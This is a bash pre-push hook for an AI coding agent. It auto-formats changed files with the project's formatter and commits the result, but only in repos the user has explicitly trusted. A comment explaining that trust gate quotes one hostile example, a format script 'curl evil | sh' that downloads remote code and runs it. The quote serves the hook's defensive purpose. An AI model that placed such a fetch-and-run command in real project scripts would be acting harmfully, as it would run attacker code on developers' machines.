#!/usr/bin/env bash
# PreToolUse hook: auto-format changed files before git push.
#
# Detects the project's formatter, runs it on files in the current diff,
# and commits any formatting changes before the push proceeds.
# Passes through silently if no formatter is detected or nothing changes.
# Never blocks a push — all errors fall through with a warning message.

# No set -e: this hook must never abort mid-execution and leave a dirty tree.
set -uo pipefail

warn_and_exit() {
  local msg="$1"
  cat <<WARN_EOF
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "permissionDecisionReason": "Auto-format hook: ${msg}"
  },
  "systemMessage": "Auto-format hook: ${msg}"
}
WARN_EOF
  exit 0
}

# jq is required to parse the hook payload (#144); degrade to a no-op
command -v jq >/dev/null 2>&1 || exit 0

input=$(cat)
command=$(echo "$input" | jq -r '.tool_input.command // empty')

if [ -z "$command" ]; then
  exit 0
fi

# Only trigger on git push (skip force pushes — guard-git-operations.sh handles those)
if ! echo "$command" | grep -qE 'git\s+push\b'; then
  exit 0
fi
if echo "$command" | grep -qE '(\s--force\b|\s-f\b|\s--force-with-lease)'; then
  exit 0
fi

# Safety: skip if working tree or index has uncommitted changes.
# Running a formatter on a dirty tree risks destroying carefully staged state.
if ! git diff --quiet 2>/dev/null || ! git diff --cached --quiet 2>/dev/null; then
  exit 0
fi

# Find changed files compared to remote tracking branch (exclude deleted files).
# Fall back to origin/main for first push of new branches.
tracking_branch=$(git rev-parse --abbrev-ref '@{upstream}' 2>/dev/null || echo "")
if [ -z "$tracking_branch" ]; then
  tracking_branch=$(git rev-parse --verify origin/main >/dev/null 2>&1 && echo "origin/main" || echo "")
fi
if [ -z "$tracking_branch" ]; then
  exit 0
fi

changed_files=$(git diff --diff-filter=d --name-only "$tracking_branch"..HEAD 2>/dev/null || echo "")
if [ -z "$changed_files" ]; then
  exit 0
fi

# Trust gate (#145): a repo's format script, a node_modules formatter, or an
# npx-downloaded one all execute repo-controlled (or freshly downloaded)
# code. A hostile clone with "format": "curl evil | sh" would otherwise run
# on the first push. Only proceed in repos the user explicitly listed.
repo_root=$(git rev-parse --show-toplevel 2>/dev/null || echo "")
if [ -z "$repo_root" ]; then
  exit 0
fi
TRUST_FILE="${HOME}/.oss-scout/format-trusted-repos"
if [ ! -f "$TRUST_FILE" ] || ! grep -Fxq "$repo_root" "$TRUST_FILE" 2>/dev/null; then
  # Only nudge about opting in when a formatter could plausibly run here.
  # Pure file-existence checks: no repo-controlled code executes pre-trust.
  if [ -f "package.json" ] || [ -f ".prettierrc" ] || [ -f ".prettierrc.json" ] \
    || [ -f "prettier.config.js" ] || [ -f "prettier.config.mjs" ] \
    || [ -f ".prettierrc.yaml" ] || [ -f "biome.json" ] || [ -f "biome.jsonc" ] \
    || [ -f "pyproject.toml" ]; then
    warn_and_exit "Skipped auto-format: this repo is not opted in. To enable, add this line to ${TRUST_FILE}: ${repo_root}"
  fi
  exit 0
fi

# Detect and run project formatter
format_result=""
format_error=""

if [ -f "package.json" ]; then
  # Detect which format script exists
  format_script=$(node -e "
    const p=require('./package.json');
    const s=p.scripts||{};
    if(s.format) console.log('format');
    else if(s['format:fix']) console.log('format:fix');
    else if(s['format:write']) console.log('format:write');
  " 2>/dev/null || echo "")

  if [ -n "$format_script" ]; then
    if [ -f "pnpm-lock.yaml" ]; then
      format_error=$(pnpm run "$format_script" 2>&1 >/dev/null) && format_result="pnpm run $format_script" || true
    elif [ -f "yarn.lock" ]; then
      format_error=$(yarn run "$format_script" 2>&1 >/dev/null) && format_result="yarn run $format_script" || true
    else
      format_error=$(npm run "$format_script" 2>&1 >/dev/null) && format_result="npm run $format_script" || true
    fi
  fi
fi

# Fallback: check for standalone formatter config files
if [ -z "$format_result" ] && [ -z "$format_error" ]; then
  if [ -f ".prettierrc" ] || [ -f ".prettierrc.json" ] || [ -f "prettier.config.js" ] || [ -f "prettier.config.mjs" ] || [ -f ".prettierrc.yaml" ]; then
    format_error=$(printf '%s\n' "$changed_files" | tr '\n' '\0' | xargs -0 npx prettier --write 2>&1 >/dev/null) && format_result="prettier" || true
  elif [ -f "biome.json" ] || [ -f "biome.jsonc" ]; then
    format_error=$(printf '%s\n' "$changed_files" | tr '\n' '\0' | xargs -0 npx @biomejs/biome format --write 2>&1 >/dev/null) && format_result="biome" || true
  elif [ -f "pyproject.toml" ] && grep -qE '\[tool\.(black|ruff)\]' pyproject.toml 2>/dev/null; then
    py_files=$(printf '%s\n' "$changed_files" | grep '\.py$' || true)
    if [ -n "$py_files" ]; then
      if command -v ruff &>/dev/null; then
        format_error=$(printf '%s\n' "$py_files" | tr '\n' '\0' | xargs -0 ruff format 2>&1 >/dev/null) && format_result="ruff format" || true
      elif command -v black &>/dev/null; then
        format_error=$(printf '%s\n' "$py_files" | tr '\n' '\0' | xargs -0 black 2>&1 >/dev/null) && format_result="black" || true
      fi
    fi
  fi
fi

# If formatter was detected but failed, warn and allow push
if [ -z "$format_result" ] && [ -n "$format_error" ]; then
  warn_and_exit "Formatter failed. Push continuing without formatting. Error: ${format_error:0:200}"
fi

if [ -z "$format_result" ]; then
  exit 0
fi

# Check if formatting changed anything
if git diff --quiet 2>/dev/null; then
  exit 0
fi

# Stage only files that are BOTH formatter-modified AND part of the branch
# diff. A repo-wide format script can sweep unrelated pre-existing drift
# into the commit (#145); restore those files instead. Filenames containing
# newlines remain unsupported (NUL-safe add/restore below covers spaces,
# quotes, and backslashes).
formatted_files=$(git diff --name-only 2>/dev/null || echo "")
if [ -z "$formatted_files" ]; then
  exit 0
fi
to_stage=$(comm -12 <(printf '%s\n' "$changed_files" | sort) <(printf '%s\n' "$formatted_files" | sort))
to_restore=$(comm -13 <(printf '%s\n' "$changed_files" | sort) <(printf '%s\n' "$formatted_files" | sort))

if [ -n "$to_restore" ]; then
  printf '%s\n' "$to_restore" | tr '\n' '\0' | xargs -0 git checkout -- >/dev/null 2>&1 || true
fi
if [ -z "$to_stage" ]; then
  exit 0
fi

if ! printf '%s\n' "$to_stage" | tr '\n' '\0' | xargs -0 git add -- >/dev/null 2>&1; then
  warn_and_exit "Failed to stage formatting changes (git add failed). Push continuing without formatting commit."
fi

if ! git commit -m "style: auto-format before push" >/dev/null 2>&1; then
  warn_and_exit "Failed to commit formatting changes. Push continuing without formatting commit."
fi

cat <<EOF
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "permissionDecisionReason": "Auto-formatted changed files (${format_result}) and committed before the push."
  },
  "systemMessage": "Auto-formatted changed files (${format_result}) and committed as 'style: auto-format before push'. The push will include this formatting commit."
}
EOF
exit 0
